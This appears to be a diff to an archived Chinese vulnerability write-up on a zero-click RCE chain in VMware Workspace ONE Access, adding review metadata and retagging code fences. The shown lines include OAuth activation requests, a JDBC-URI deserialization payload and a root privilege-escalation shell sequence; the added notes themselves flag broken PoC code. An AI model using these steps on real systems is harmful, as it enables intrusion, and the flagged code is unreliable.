@@ -1,8 +1,58 @@
 ---
 source: "MrWQ/vulnerability-paper"
+title: "0Click RCE：攻击 VMWare Workspace ONE Access"
+product: "VMware Workspace ONE Access/IAM专题"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_role: "unknown"
+source_url: "https://mp.weixin.qq.com/s/OjpDC707h4Qn5jkIsX0FBA"
+source_status: "recorded"
+prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
+side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。"
+id: "vw-e38d71a943b4f9d90515f130"
+entity_id: "ve-e38d71a943b4f9d90515f130"
+schema_version: "1"
 ---
 
 # 0Click RCE：攻击 VMWare Workspace ONE Access
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+
+### 本次正文校订
+
+- 按实际内容修正 5 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 缺主CVE元数据，22954SSTI与OAuth/JDBC/提权三链及Oracle35587/OpenAM35464/4006背景不可合为同漏洞
+- IAM介绍混AWS产品与AUTOSAR术语，JWT误写Java Web Token
+- IAM必须外网不成立
+- XML多处OCR损坏如xnlns/ProcessButlder/value/constructo-arg不可解析
+- Java PoC同作用域Object payload与String payload重复声明无法编译
+- MySQL属性autoSerialize疑应autoDeserialize需核驱动
+- dbCheck鉴权异常被catch吞掉与作者必须管理员分析矛盾需核源码
+- shell用//当注释且tmp相对与/tmp绝对路径混用，rm -rf tmp及覆盖服务脚本需回滚
+- chmod644并非人人可写
+- 无完整修复版本映射
+
+### 操作风险与资料使用
+
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OjpDC707h4Qn5jkIsX0FBA)
@@ -229,7 +279,7 @@ D 步骤中，客户端向认证服务器申请令牌的 HTTP 请求，包含以
 
 下面是一个例子
 
-```
+```http
 POST /token HTTP/1.1
 Host: server.example.com
 Authorization: Basic czZCaGRSa3F0MzpnWDFmQmF0M2JW
@@ -804,7 +854,7 @@ fi
 
 请求包：
 
-```
+```http
 POST /SAAS/API/1.0/REST/oauth2/generateActivationToken/Service__OAuth2Client HTTP/1.1
 Host: photon-machine
 Content-Type: application/x-www-form-urlencoded
@@ -828,7 +878,7 @@ Content-Length: 0
 
 请求包：
 
-```
+```http
 POST /SAAS/API/1.0/REST/oauth2/activate HTTP/1.1
 Host: photon-machine
 Content-Type: application/x-www-form-urlencoded
@@ -982,7 +1032,7 @@ private boolean deserialize_v2(DataInputStream var1) throws IOException {
 
 在这里先进行调用 decrypt，并使用硬编码密钥 keyBytes_v2 解密字符串，然后对可控字符串调用 readObject 进行反序列化。所以这里是通过 JDBC URI 注入去打 LicenseChecker 类中的反序列化，poc 如下：
 
-```
+```python
 import com.vmware.licensecheck.LicenseChecker;
 import com.vmware.licensecheck.LicenseHandle;
 import com.vmware.licensecheck.MyBase64;
@@ -1031,7 +1081,7 @@ jdbc:postgresql://si/saas?socketFactory=com.vmware.licensecheck.LicenseChecker%2
 
 在前文已经讲过，利用 publishCaCert.hzn 和 gatherConfig.hzn 脚本中的代码可以进行对具有 root 权限的文件进行覆盖重写，进而进行提权，poc 如下：
 
-```
+```shell
 sudo /usr/local/horizon/scripts/publishCaCert.hzn /opt/vmware/certproxy/bin/certproxyService.sh tmp
 mkdir tmp
 ln -s /opt/vmware/certproxy/bin/certproxyService.sh /tmp/debugConfig.txt
